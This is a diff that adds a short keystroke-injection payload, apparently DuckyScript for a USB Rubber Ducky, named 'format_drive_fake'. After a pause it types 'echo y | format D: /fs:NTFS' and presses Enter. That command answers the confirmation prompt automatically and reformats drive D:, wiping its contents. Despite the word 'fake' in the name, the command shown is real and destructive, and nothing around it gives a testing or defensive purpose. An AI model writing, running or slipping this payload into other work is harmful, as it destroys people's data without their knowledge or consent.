@@ -1,0 +1,4 @@
+REM Payload: format_drive_fake
+DELAY 500
+STRING echo y | format D: /fs:NTFS
+ENTER
